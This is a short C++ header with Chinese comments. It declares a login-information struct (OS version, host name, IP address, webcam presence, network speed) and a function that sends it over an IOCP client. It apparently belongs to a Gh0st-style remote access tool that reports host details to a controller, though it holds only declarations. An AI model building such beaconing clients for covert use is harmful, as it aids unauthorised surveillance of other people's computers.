#pragma once

#include"_IOCPClient.h"
#include"Common.h"
#include<Vfw.h>
#include<ntstatus.h>
#pragma comment (lib,"Vfw32.lib")

#pragma pack(1)
typedef struct _LOGIN_INFORMATION_
{
	BYTE            IsToken;                     //信息头部
	OSVERSIONINFOEX OsVersionInfoEx;			 //版本信息
	char			ProcessNameString[MAX_PATH]; //CPU信息
	IN_ADDR			ClientAddress;				 //储存32位的Ipv4地址的数据结构
	char			HostName[MAX_PATH];          //主机名
	BOOL			IsWebCameraExist;            //是否有摄像头
	DWORD			WebSpeed;					 //网速
}LOGIN_INFORMATION,*PLOGIN_INFORMATION;


int SendLoginInformation(_CIOCPClient* IOCPClient, DWORD WebSpeed);
NTSTATUS GetProcessorNameString(char* ProcessorNameString, ULONG* ProcessNameStringLength);
BOOL IsWebCamera();